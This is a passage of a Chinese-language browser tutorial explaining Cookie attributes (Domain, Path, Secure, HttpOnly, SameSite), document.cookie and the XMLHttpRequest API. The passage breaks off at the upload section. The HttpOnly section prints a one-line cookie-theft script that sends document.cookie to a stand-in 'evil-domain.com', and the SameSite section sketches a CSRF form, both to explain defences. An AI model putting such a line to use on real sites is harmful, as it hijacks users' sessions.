    > 不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过30个，每个 Cookie 的大小不能超过 4KB。超过限制以后，Cookie 将被忽略，不会被设置。
    >
    > Cookie 是按照域名区分的，`foo.com`只能读取自己放置的 Cookie，无法读取其他网站（比如`bar.com`）放置的 Cookie。一般情况下，一级域名也不能读取二级域名留下的 Cookie，比如`mydomain.com`不能读取`subdomain.mydomain.com`设置的 Cookie。但是有一个例外，设置 Cookie 的时候（不管是一级域名设置的，还是二级域名设置的），明确将`domain`属性设为一级域名，则这个域名下面的各级域名可以共享这个 Cookie。
    >
    > ```
    > Set-Cookie: name=value; domain=mydomain.com
    > ```
    >
    > 上面示例中，设置 Cookie 时，`domain`属性设为`mydomain.com`，那么各级的子域名和一级域名都可以读取这个 Cookie。
    >
    > 注意，区分 Cookie 时不考虑协议和端口。也就是说，`http://example.com`设置的 Cookie，可以被`https://example.com`或`http://example.com:8080`读取。
    >
    > ## Cookie 与 HTTP 协议
    >
    > Cookie 由 HTTP 协议生成，也主要是供 HTTP 协议使用。
    >
    > ### HTTP 回应：Cookie 的生成
    >
    > 服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个`Set-Cookie`字段。
    >
    > ```
    > Set-Cookie:foo=bar
    > ```
    >
    > 上面代码会在浏览器保存一个名为`foo`的 Cookie，它的值为`bar`。
    >
    > HTTP 回应可以包含多个`Set-Cookie`字段，即在浏览器生成多个 Cookie。下面是一个例子。
    >
    > ```
    > HTTP/1.0 200 OK
    > Content-type: text/html
    > Set-Cookie: yummy_cookie=choco
    > Set-Cookie: tasty_cookie=strawberry
    > 
    > [page content]
    > ```
    >
    > 除了 Cookie 的值，`Set-Cookie`字段还可以附加 Cookie 的属性。
    >
    > ```
    > Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date>
    > Set-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>
    > Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>
    > Set-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>
    > Set-Cookie: <cookie-name>=<cookie-value>; Secure
    > Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly
    > ```
    >
    > 上面的几个属性的含义，将在后文解释。
    >
    > 一个`Set-Cookie`字段里面，可以同时包括多个属性，没有次序的要求。
    >
    > ```
    > Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly
    > ```
    >
    > 下面是一个例子。
    >
    > ```
    > Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
    > ```
    >
    > 如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的`key`、`domain`、`path`和`secure`都匹配。举例来说，如果原始的 Cookie 是用如下的`Set-Cookie`设置的。
    >
    > ```
    > Set-Cookie: key1=value1; domain=example.com; path=/blog
    > ```
    >
    > 改变上面这个 Cookie 的值，就必须使用同样的`Set-Cookie`。
    >
    > ```
    > Set-Cookie: key1=value2; domain=example.com; path=/blog
    > ```
    >
    > 只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。
    >
    > ```
    > Set-Cookie: key1=value2; domain=example.com; path=/
    > ```
    >
    > 上面的命令设置了一个全新的同名 Cookie，但是`path`属性不一样。下一次访问`example.com/blog`的时候，浏览器将向服务器发送两个同名的 Cookie。
    >
    > ```
    > Cookie: key1=value1; key1=value2
    > ```
    >
    > 上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。
    >
    > ### HTTP 请求：Cookie 的发送
    >
    > 浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的`Cookie`字段。
    >
    > ```
    > Cookie: foo=bar
    > ```
    >
    > 上面代码会向服务器发送名为`foo`的 Cookie，值为`bar`。
    >
    > `Cookie`字段可以包含多个 Cookie，使用分号（`;`）分隔。
    >
    > ```
    > Cookie: name=value; name2=value2; name3=value3
    > ```
    >
    > 下面是一个例子。
    >
    > ```
    > GET /sample_page.html HTTP/1.1
    > Host: www.example.org
    > Cookie: yummy_cookie=choco; tasty_cookie=strawberry
    > ```
    >
    > 服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。
    >
    > - Cookie 的各种属性，比如何时过期。
    > - 哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。
    >
    > ## Cookie 的属性
    >
    > ### Expires，Max-Age
    >
    > `Expires`属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用`Date.prototype.toUTCString()`进行格式转换。
    >
    > ```
    > Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
    > ```
    >
    > 如果不设置该属性，或者设为`null`，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。
    >
    > `Max-Age`属性指定从现在开始 Cookie 存在的秒数，比如`60 * 60 * 24 * 365`（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。
    >
    > 如果同时指定了`Expires`和`Max-Age`，那么`Max-Age`的值将优先生效。
    >
    > 如果`Set-Cookie`字段没有指定`Expires`或`Max-Age`属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。
    >
    > ### Domain，Path
    >
    > `Domain`属性指定 Cookie 属于哪个域名，以后浏览器向服务器发送 HTTP 请求时，通过这个属性判断是否要附带某个 Cookie。
    >
    > 服务器设定 Cookie 时，如果没有指定 Domain 属性，浏览器会默认将其设为浏览器的当前域名。如果当前域名是一个 IP 地址，则不得设置 Domain 属性。
    >
    > 如果指定 Domain 属性，需要遵守下面规则：Domain 属性只能是当前域名或者当前域名的上级域名，但设为上级域名时，不能设为顶级域名或公共域名。（顶级域名指的是 .com、.net 这样的域名，公共域名指的是开放给外部用户设置子域名的域名，比如 github.io。）如果不符合上面这条规则，浏览器会拒绝设置这个 Cookie。
    >
    > 举例来说，当前域名为`x.y.z.com`，那么 Domain 属性可以设为`x.y.z.com`，或者`y.z.com`，或者`z.com`，但不能设为`foo.x.y.z.com`，或者`another.domain.com`。
    >
    > 另一个例子是，当前域名为`wangdoc.github.io`，则 Domain 属性只能设为`wangdoc.github.io`，不能设为`github.io`，因为后者是一个公共域名。
    >
    > 浏览器发送 Cookie 时，Domain 属性必须与当前域名一致，或者是当前域名的上级域名（公共域名除外）。比如，Domain 属性是`y.z.com`，那么适用于`y.z.com`、`x.y.z.com`、`foo.x.y.z.com`等域名。再比如，Domain 属性是公共域名`github.io`，那么只适用于`github.io`这个域名本身，不适用于它的子域名`wangdoc.github.io`。
    >
    > `Path`属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，`Path`属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，`Path`属性是`/`，那么请求`/docs`路径也会包含该 Cookie。当然，前提是 Domain 属性必须符合条件。
    >
    > ### Secure，HttpOnly
    >
    > `Secure`属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的`Secure`属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。
    >
    > `HttpOnly`属性指定该 Cookie 无法通过 JS 脚本拿到，主要是`document.cookie`属性、`XMLHttpRequest`对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。
    >
    > ```
    > (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
    > ```
    >
    > 上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的`HttpOnly`属性，上面代码就不会读到该 Cookie。
    >
    > ### SameSite
    >
    > Chrome 51 开始，浏览器的 Cookie 新增加了一个`SameSite`属性，用来防止 CSRF 攻击和用户追踪。
    >
    > Cookie 往往用来存储用户的身份信息，恶意网站可以设法伪造带有正确 Cookie 的 HTTP 请求，这就是 CSRF 攻击。举例来说，用户登陆了银行网站`your-bank.com`，银行服务器发来了一个 Cookie。
    >
    > ```
    > Set-Cookie:id=a3fWa;
    > ```
    >
    > 用户后来又访问了恶意网站`malicious.com`，上面有一个表单。
    >
    > ```
    > <form action="your-bank.com/transfer" method="POST">
    >   ...
    > </form>
    > ```
    >
    > 用户一旦被诱骗发送这个表单，银行网站就会收到带有正确 Cookie 的请求。为了防止这种攻击，官网的表单一般都带有一个随机 token，官网服务器通过验证这个随机 token，确认是否为真实请求。
    >
    > ```
    > <form action="your-bank.com/transfer" method="POST">
    >   <input type="hidden" name="token" value="dad3weg34">
    >   ...
    > </form>
    > ```
    >
    > 这种第三方网站引导而附带发送的 Cookie，就称为第三方 Cookie。它除了用于 CSRF 攻击，还可以用于用户追踪。比如，Facebook 在第三方网站插入一张看不见的图片。
    >
    > ```
    > <img src="facebook.com" style="visibility:hidden;">
    > ```
    >
    > 浏览器加载上面代码时，就会向 Facebook 发出带有 Cookie 的请求，从而 Facebook 就会知道你是谁，访问了什么网站。
    >
    > Cookie 的`SameSite`属性用来限制第三方 Cookie，从而减少安全风险。它可以设置三个值。
    >
    > > - Strict
    > > - Lax
    > > - None
    >
    > **（1）Strict**
    >
    > `Strict`最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。
    >
    > ```
    > Set-Cookie: CookieName=CookieValue; SameSite=Strict;
    > ```
    >
    > 这个规则过于严格，可能造成非常不好的用户体验。比如，当前网页有一个 GitHub 链接，用户点击跳转就不会带有 GitHub 的 Cookie，跳转过去总是未登陆状态。
    >
    > **（2）Lax**
    >
    > `Lax`规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。
    >
    > ```
    > Set-Cookie: CookieName=CookieValue; SameSite=Lax;
    > ```
    >
    > 导航到目标网址的 GET 请求，只包括三种情况：链接，预加载请求，GET 表单。详见下表。
    >
    > | 请求类型  |                 示例                 |    正常情况 | Lax         |
    > | --------- | :----------------------------------: | ----------: | ----------- |
    > | 链接      |         `<a href="..."></a>`         | 发送 Cookie | 发送 Cookie |
    > | 预加载    | `<link rel="prerender" href="..."/>` | 发送 Cookie | 发送 Cookie |
    > | GET 表单  |  `<form method="GET" action="...">`  | 发送 Cookie | 发送 Cookie |
    > | POST 表单 | `<form method="POST" action="...">`  | 发送 Cookie | 不发送      |
    > | iframe    |    `<iframe src="..."></iframe>`     | 发送 Cookie | 不发送      |
    > | AJAX      |            `$.get("...")`            | 发送 Cookie | 不发送      |
    > | Image     |          `<img src="...">`           | 发送 Cookie | 不发送      |
    >
    > 设置了`Strict`或`Lax`以后，基本就杜绝了 CSRF 攻击。当然，前提是用户浏览器支持 SameSite 属性。
    >
    > **（3）None**
    >
    > Chrome 计划将`Lax`变为默认设置。这时，网站可以选择显式关闭`SameSite`属性，将其设为`None`。不过，前提是必须同时设置`Secure`属性（Cookie 只能通过 HTTPS 协议发送），否则无效。
    >
    > 下面的设置无效。
    >
    > ```
    > Set-Cookie: widget_session=abc123; SameSite=None
    > ```
    >
    > 下面的设置有效。
    >
    > ```
    > Set-Cookie: widget_session=abc123; SameSite=None; Secure
    > ```
    >
    > ## document.cookie
    >
    > `document.cookie`属性用于读写当前网页的 Cookie。
    >
    > 读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有`HTTPOnly`属性。
    >
    > ```
    > document.cookie // "foo=bar;baz=bar"
    > ```
    >
    > 上面代码从`document.cookie`一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。
    >
    > ```
    > var cookies = document.cookie.split(';');
    > 
    > for (var i = 0; i < cookies.length; i++) {
    >   console.log(cookies[i]);
    > }
    > // foo=bar
    > // baz=bar
    > ```
    >
    > `document.cookie`属性是可写的，可以通过它为当前网站添加 Cookie。
    >
    > ```
    > document.cookie = 'fontSize=14';
    > ```
    >
    > 写入的时候，Cookie 的值必须写成`key=value`的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用`encodeURIComponent`方法达到。
    >
    > 但是，`document.cookie`一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。
    >
    > ```
    > document.cookie = 'test1=hello';
    > document.cookie = 'test2=world';
    > document.cookie
    > // test1=hello;test2=world
    > ```
    >
    > `document.cookie`读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，`Cookie`字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，`Set-Cookie`字段是一行设置一个 Cookie。
    >
    > 写入 Cookie 的时候，可以一起写入 Cookie 的属性。
    >
    > ```
    > document.cookie = "foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT";
    > ```
    >
    > 上面代码中，写入 Cookie 的时候，同时设置了`expires`属性。属性值的等号两边，也是不能有空格的。
    >
    > 各个属性的写入注意点如下。
    >
    > - `path`属性必须为绝对路径，默认为当前路径。
    > - `domain`属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是`example.com`，就不能将其设为`foo.com`。该属性默认为当前的一级域名（不含二级域名）。如果显式设置该属性，则该域名的任意子域名也可以读取 Cookie。
    > - `max-age`属性的值为秒数。
    > - `expires`属性的值为 UTC 格式，可以使用`Date.prototype.toUTCString()`进行日期格式转换。
    >
    > `document.cookie`写入 Cookie 的例子如下。
    >
    > ```
    > document.cookie = 'fontSize=14; '
    >   + 'expires=' + someDate.toGMTString() + '; '
    >   + 'path=/subdirectory; '
    >   + 'domain=example.com';
    > ```
    >
    > 注意，上面的`domain`属性，以前的写法是`.example.com`，表示子域名也可以读取该 Cookie，新的写法可以省略前面的点。
    >
    > Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。
    >
    > 删除一个现存 Cookie 的唯一方法，是设置它的`expires`属性为一个过去的日期。
    >
    > ```
    > document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';
    > ```
    >
    > 上面代码中，名为`fontSize`的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。

  - XMLHttpRequest 对象

    > ## 简介
    >
    > 浏览器与服务器之间，采用 HTTP 协议通信。用户在浏览器地址栏键入一个网址，或者通过网页表单向服务器提交内容，这时浏览器就会向服务器发出 HTTP 请求。
    >
    > 1999年，微软公司发布 IE 浏览器5.0版，第一次引入新功能：允许 JS 脚本向服务器发起 HTTP 请求。这个功能当时并没有引起注意，直到2004年 Gmail 发布和2005年 Google Map 发布，才引起广泛重视。2005年2月，AJAX 这个词第一次正式提出，它是 Asynchronous JavaScript and XML 的缩写，指的是通过 JavaScript 的异步通信，从服务器获取 XML 文档从中提取数据，再更新当前网页的对应部分，而不用刷新整个网页。后来，AJAX 这个词就成为 JavaScript 脚本发起 HTTP 通信的代名词，也就是说，只要用脚本发起通信，就可以叫做 AJAX 通信。W3C 也在2006年发布了它的国际标准。
    >
    > 具体来说，AJAX 包括以下几个步骤。
    >
    > 1. 创建 XMLHttpRequest 实例
    > 2. 发出 HTTP 请求
    > 3. 接收服务器传回的数据
    > 4. 更新网页数据
    >
    > 概括起来，就是一句话，AJAX 通过原生的`XMLHttpRequest`对象发出 HTTP 请求，得到服务器返回的数据后，再进行处理。现在，服务器返回的都是 JSON 格式的数据，XML 格式已经过时了，但是 AJAX 这个名字已经成了一个通用名词，字面含义已经消失了。
    >
    > `XMLHttpRequest`对象是 AJAX 的主要接口，用于浏览器与服务器之间的通信。尽管名字里面有`XML`和`Http`，它实际上可以使用多种协议（比如`file`或`ftp`），发送任何格式的数据（包括字符串和二进制）。
    >
    > `XMLHttpRequest`本身是一个构造函数，可以使用`new`命令生成实例。它没有任何参数。
    >
    > ```
    > var xhr = new XMLHttpRequest();
    > ```
    >
    > 一旦新建实例，就可以使用`open()`方法指定建立 HTTP 连接的一些细节。
    >
    > ```
    > xhr.open('GET', 'http://www.example.com/page.php', true);
    > ```
    >
    > 上面代码指定使用 GET 方法，跟指定的服务器网址建立连接。第三个参数`true`，表示请求是异步的。
    >
    > 然后，指定回调函数，监听通信状态（`readyState`属性）的变化。
    >
    > ```
    > xhr.onreadystatechange = handleStateChange;
    > 
    > function handleStateChange() {
    >   // ...
    > }
    > ```
    >
    > 上面代码中，一旦`XMLHttpRequest`实例的状态发生变化，就会调用监听函数`handleStateChange`
    >
    > 最后使用`send()`方法，实际发出请求。
    >
    > ```
    > xhr.send(null);
    > ```
    >
    > 上面代码中，`send()`的参数为`null`，表示发送请求的时候，不带有数据体。如果发送的是 POST 请求，这里就需要指定数据体。
    >
    > 一旦拿到服务器返回的数据，AJAX 不会刷新整个网页，而是只更新网页里面的相关部分，从而不打断用户正在做的事情。
    >
    > 注意，AJAX 只能向同源网址（协议、域名、端口都相同）发出 HTTP 请求，如果发出跨域请求，就会报错（详见《同源政策》和《CORS 通信》两章）。
    >
    > 下面是`XMLHttpRequest`对象简单用法的完整例子。
    >
    > ```
    > var xhr = new XMLHttpRequest();
    > 
    > xhr.onreadystatechange = function(){
    >   // 通信成功时，状态值为4
    >   if (xhr.readyState === 4){
    >     if (xhr.status === 200){
    >       console.log(xhr.responseText);
    >     } else {
    >       console.error(xhr.statusText);
    >     }
    >   }
    > };
    > 
    > xhr.onerror = function (e) {
    >   console.error(xhr.statusText);
    > };
    > 
    > xhr.open('GET', '/endpoint', true);
    > xhr.send(null);
    > ```
    >
    > ## XMLHttpRequest 的实例属性
    >
    > ### XMLHttpRequest.readyState
    >
    > `XMLHttpRequest.readyState`返回一个整数，表示实例对象的当前状态。该属性只读。它可能返回以下值。
    >
    > - 0，表示 XMLHttpRequest 实例已经生成，但是实例的`open()`方法还没有被调用。
    > - 1，表示`open()`方法已经调用，但是实例的`send()`方法还没有调用，仍然可以使用实例的`setRequestHeader()`方法，设定 HTTP 请求的头信息。
    > - 2，表示实例的`send()`方法已经调用，并且服务器返回的头信息和状态码已经收到。
    > - 3，表示正在接收服务器传来的数据体（body 部分）。这时，如果实例的`responseType`属性等于`text`或者空字符串，`responseText`属性就会包含已经收到的部分信息。
    > - 4，表示服务器返回的数据已经完全接收，或者本次接收已经失败。
    >
    > 通信过程中，每当实例对象发生状态变化，它的`readyState`属性的值就会改变。这个值每一次变化，都会触发`readyStateChange`事件。
    >
    > ```
    > var xhr = new XMLHttpRequest();
    > 
    > if (xhr.readyState === 4) {
    >   // 请求结束，处理服务器返回的数据
    > } else {
    >   // 显示提示“加载中……”
    > }
    > ```
    >
    > 上面代码中，`xhr.readyState`等于`4`时，表明脚本发出的 HTTP 请求已经完成。其他情况，都表示 HTTP 请求还在进行中。
    >
    > ### XMLHttpRequest.onreadystatechange
    >
    > `XMLHttpRequest.onreadystatechange`属性指向一个监听函数。`readystatechange`事件发生时（实例的`readyState`属性变化），就会执行这个属性。
    >
    > 另外，如果使用实例的`abort()`方法，终止 XMLHttpRequest 请求，也会造成`readyState`属性变化，导致调用`XMLHttpRequest.onreadystatechange`属性。
    >
    > 下面是一个例子。
    >
    > ```
    > var xhr = new XMLHttpRequest();
    > xhr.open( 'GET', 'http://example.com' , true );
    > xhr.onreadystatechange = function () {
    >   if (xhr.readyState !== 4 || xhr.status !== 200) {
    >     return;
    >   }
    >   console.log(xhr.responseText);
    > };
    > xhr.send();
    > ```
    >
    > ### XMLHttpRequest.response
    >
    > `XMLHttpRequest.response`属性表示服务器返回的数据体（即 HTTP 回应的 body 部分）。它可能是任何数据类型，比如字符串、对象、二进制对象等等，具体的类型由`XMLHttpRequest.responseType`属性决定。该属性只读。
    >
    > 如果本次请求没有成功或者数据不完整，该属性等于`null`。但是，如果`responseType`属性等于`text`或空字符串，在请求没有结束之前（`readyState`等于3的阶段），`response`属性包含服务器已经返回的部分数据。
    >
    > ```
    > var xhr = new XMLHttpRequest();
    > 
    > xhr.onreadystatechange = function () {
    >   if (xhr.readyState === 4) {
    >     handler(xhr.response);
    >   }
    > }
    > ```
    >
    > ### XMLHttpRequest.responseType
    >
    > `XMLHttpRequest.responseType`属性是一个字符串，表示服务器返回数据的类型。这个属性是可写的，可以在调用`open()`方法之后、调用`send()`方法之前，设置这个属性的值，告诉浏览器如何解读返回的数据。如果`responseType`设为空字符串，就等同于默认值`text`。
    >
    > `XMLHttpRequest.responseType`属性可以等于以下值。
    >
    > - ""（空字符串）：等同于`text`，表示服务器返回文本数据。
    > - "arraybuffer"：ArrayBuffer 对象，表示服务器返回二进制数组。
    > - "blob"：Blob 对象，表示服务器返回二进制对象。
    > - "document"：Document 对象，表示服务器返回一个文档对象。
    > - "json"：JSON 对象。
    > - "text"：字符串。
    >
    > 上面几种类型之中，`text`类型适合大多数情况，而且直接处理文本也比较方便。`document`类型适合返回 HTML / XML 文档的情况，这意味着，对于那些打开 CORS 的网站，可以直接用 Ajax 抓取网页，然后不用解析 HTML 字符串，直接对抓取回来的数据进行 DOM 操作。`blob`类型适合读取二进制数据，比如图片文件。
    >
    > ```
    > var xhr = new XMLHttpRequest();
    > xhr.open('GET', '/path/to/image.png', true);
    > xhr.responseType = 'blob';
    > 
    > xhr.onload = function(e) {
    >   if (this.status === 200) {
    >     var blob = new Blob([xhr.response], {type: 'image/png'});
    >     // 或者
    >     var blob = xhr.response;
    >   }
    > };
    > 
    > xhr.send();
    > ```
    >
    > 如果将这个属性设为`ArrayBuffer`，就可以按照数组的方式处理二进制数据。
    >
    > ```
    > var xhr = new XMLHttpRequest();
    > xhr.open('GET', '/path/to/image.png', true);
    > xhr.responseType = 'arraybuffer';
    > 
    > xhr.onload = function(e) {
    >   var uInt8Array = new Uint8Array(this.response);
    >   for (var i = 0, len = uInt8Array.length; i < len; ++i) {
    >     // var byte = uInt8Array[i];
    >   }
    > };
    > 
    > xhr.send();
    > ```
    >
    > 如果将这个属性设为`json`，浏览器就会自动对返回数据调用`JSON.parse()`方法。也就是说，从`xhr.response`属性（注意，不是`xhr.responseText`属性）得到的不是文本，而是一个 JSON 对象。
    >
    > ### XMLHttpRequest.responseText
    >
    > `XMLHttpRequest.responseText`属性返回从服务器接收到的字符串，该属性为只读。只有 HTTP 请求完成接收以后，该属性才会包含完整的数据。
    >
    > ```
    > var xhr = new XMLHttpRequest();
    > xhr.open('GET', '/server', true);
    > 
    > xhr.responseType = 'text';
    > xhr.onload = function () {
    >   if (xhr.readyState === 4 && xhr.status === 200) {
    >     console.log(xhr.responseText);
    >   }
    > };
    > 
    > xhr.send(null);
    > ```
    >
    > ### XMLHttpRequest.responseXML
    >
    > `XMLHttpRequest.responseXML`属性返回从服务器接收到的 HTML 或 XML 文档对象，该属性为只读。如果本次请求没有成功，或者收到的数据不能被解析为 XML 或 HTML，该属性等于`null`。
    >
    > 该属性生效的前提是 HTTP 回应的`Content-Type`头信息等于`text/xml`或`application/xml`。这要求在发送请求前，`XMLHttpRequest.responseType`属性要设为`document`。如果 HTTP 回应的`Content-Type`头信息不等于`text/xml`和`application/xml`，但是想从`responseXML`拿到数据（即把数据按照 DOM 格式解析），那么需要手动调用`XMLHttpRequest.overrideMimeType()`方法，强制进行 XML 解析。
    >
    > 该属性得到的数据，是直接解析后的文档 DOM 树。
    >
    > ```
    > var xhr = new XMLHttpRequest();
    > xhr.open('GET', '/server', true);
    > 
    > xhr.responseType = 'document';
    > xhr.overrideMimeType('text/xml');
    > 
    > xhr.onload = function () {
    >   if (xhr.readyState === 4 && xhr.status === 200) {
    >     console.log(xhr.responseXML);
    >   }
    > };
    > 
    > xhr.send(null);
    > ```
    >
    > ### XMLHttpRequest.responseURL
    >
    > `XMLHttpRequest.responseURL`属性是字符串，表示发送数据的服务器的网址。
    >
    > ```
    > var xhr = new XMLHttpRequest();
    > xhr.open('GET', 'http://example.com/test', true);
    > xhr.onload = function () {
    >   // 返回 http://example.com/test
    >   console.log(xhr.responseURL);
    > };
    > xhr.send(null);
    > ```
    >
    > 注意，这个属性的值与`open()`方法指定的请求网址不一定相同。如果服务器端发生跳转，这个属性返回最后实际返回数据的网址。另外，如果原始 URL 包括锚点（fragment），该属性会把锚点剥离。
    >
    > ### XMLHttpRequest.status，XMLHttpRequest.statusText
    >
    > `XMLHttpRequest.status`属性返回一个整数，表示服务器回应的 HTTP 状态码。一般来说，如果通信成功的话，这个状态码是200；如果服务器没有返回状态码，那么这个属性默认是200。请求发出之前，该属性为`0`。该属性只读。
    >
    > - 200, OK，访问正常
    > - 301, Moved Permanently，永久移动
    > - 302, Moved temporarily，暂时移动
    > - 304, Not Modified，未修改
    > - 307, Temporary Redirect，暂时重定向
    > - 401, Unauthorized，未授权
    > - 403, Forbidden，禁止访问
    > - 404, Not Found，未发现指定网址
    > - 500, Internal Server Error，服务器发生错误
    >
    > 基本上，只有2xx和304的状态码，表示服务器返回是正常状态。
    >
    > ```
    > if (xhr.readyState === 4) {
    >   if ( (xhr.status >= 200 && xhr.status < 300)
    >     || (xhr.status === 304) ) {
    >     // 处理服务器的返回数据
    >   } else {
    >     // 出错
    >   }
    > }
    > ```
    >
    > `XMLHttpRequest.statusText`属性返回一个字符串，表示服务器发送的状态提示。不同于`status`属性，该属性包含整个状态信息，比如“OK”和“Not Found”。在请求发送之前（即调用`open()`方法之前），该属性的值是空字符串；如果服务器没有返回状态提示，该属性的值默认为“OK”。该属性为只读属性。
    >
    > ### XMLHttpRequest.timeout，XMLHttpRequestEventTarget.ontimeout
    >
    > `XMLHttpRequest.timeout`属性返回一个整数，表示多少毫秒后，如果请求仍然没有得到结果，就会自动终止。如果该属性等于0，就表示没有时间限制。
    >
    > `XMLHttpRequestEventTarget.ontimeout`属性用于设置一个监听函数，如果发生 timeout 事件，就会执行这个监听函数。
    >
    > 下面是一个例子。
    >
    > ```
    > var xhr = new XMLHttpRequest();
    > var url = '/server';
    > 
    > xhr.ontimeout = function () {
    >   console.error('The request for ' + url + ' timed out.');
    > };
    > 
    > xhr.onload = function() {
    >   if (xhr.readyState === 4) {
    >     if (xhr.status === 200) {
    >       // 处理服务器返回的数据
    >     } else {
    >       console.error(xhr.statusText);
    >     }
    >   }
    > };
    > 
    > xhr.open('GET', url, true);
    > // 指定 10 秒钟超时
    > xhr.timeout = 10 * 1000;
    > xhr.send(null);
    > ```
    >
    > ### 事件监听属性
    >
    > XMLHttpRequest 对象可以对以下事件指定监听函数。
    >
    > - XMLHttpRequest.onloadstart：loadstart 事件（HTTP 请求发出）的监听函数
    > - XMLHttpRequest.onprogress：progress事件（正在发送和加载数据）的监听函数
    > - XMLHttpRequest.onabort：abort 事件（请求中止，比如用户调用了`abort()`方法）的监听函数
    > - XMLHttpRequest.onerror：error 事件（请求失败）的监听函数
    > - XMLHttpRequest.onload：load 事件（请求成功完成）的监听函数
    > - XMLHttpRequest.ontimeout：timeout 事件（用户指定的时限超过了，请求还未完成）的监听函数
    > - XMLHttpRequest.onloadend：loadend 事件（请求完成，不管成功或失败）的监听函数
    >
    > 下面是一个例子。
    >
    > ```
    > xhr.onload = function() {
    >  var responseText = xhr.responseText;
    >  console.log(responseText);
    >  // process the response.
    > };
    > 
    > xhr.onabort = function () {
    >   console.log('The request was aborted');
    > };
    > 
    > xhr.onprogress = function (event) {
    >   console.log(event.loaded);
    >   console.log(event.total);
    > };
    > 
    > xhr.onerror = function() {
    >   console.log('There was an error!');
    > };
    > ```
    >
    > `progress`事件的监听函数有一个事件对象参数，该对象有三个属性：`loaded`属性返回已经传输的数据量，`total`属性返回总的数据量，`lengthComputable`属性返回一个布尔值，表示加载的进度是否可以计算。所有这些监听函数里面，只有`progress`事件的监听函数有参数，其他函数都没有参数。
    >
    > 注意，如果发生网络错误（比如服务器无法连通），`onerror`事件无法获取报错信息。也就是说，可能没有错误对象，所以这样只能显示报错的提示。
    >
    > ### XMLHttpRequest.withCredentials
    >
    > `XMLHttpRequest.withCredentials`属性是一个布尔值，表示跨域请求时，用户信息（比如 Cookie 和认证的 HTTP 头信息）是否会包含在请求之中，默认为`false`，即向`example.com`发出跨域请求时，不会发送`example.com`设置在本机上的 Cookie（如果有的话）。
    >
    > 如果需要跨域 AJAX 请求发送 Cookie，需要`withCredentials`属性设为`true`。注意，同源的请求不需要设置这个属性。
    >
    > ```
    > var xhr = new XMLHttpRequest();
    > xhr.open('GET', 'http://example.com/', true);
    > xhr.withCredentials = true;
    > xhr.send(null);
    > ```
    >
    > 为了让这个属性生效，服务器必须显式返回`Access-Control-Allow-Credentials`这个头信息。
    >
    > ```
    > Access-Control-Allow-Credentials: true
    > ```
    >
    > `withCredentials`属性打开的话，跨域请求不仅会发送 Cookie，还会设置远程主机指定的 Cookie。反之也成立，如果`withCredentials`属性没有打开，那么跨域的 AJAX 请求即使明确要求浏览器设置 Cookie，浏览器也会忽略。
    >
    > 注意，脚本总是遵守同源政策，无法从`document.cookie`或者 HTTP 回应的头信息之中，读取跨域的 Cookie，`withCredentials`属性不影响这一点。
    >
    > ### XMLHttpRequest.upload
    >
    > XMLHttpRequest 不仅可以发送请求，还可以发送文件，这就是 AJAX 文件上传。发送文件以后，通过`XMLHttpRequest.upload`属性可以得到一个对象，通过观察这个对象，可以得知上传的进展。主要方法就是监听这个对象的各种事件：loadstart、loadend、load、abort、error、progress、timeout。
    >
    > 假定网页上有一个`<progress>`元素。
    >
    > ```
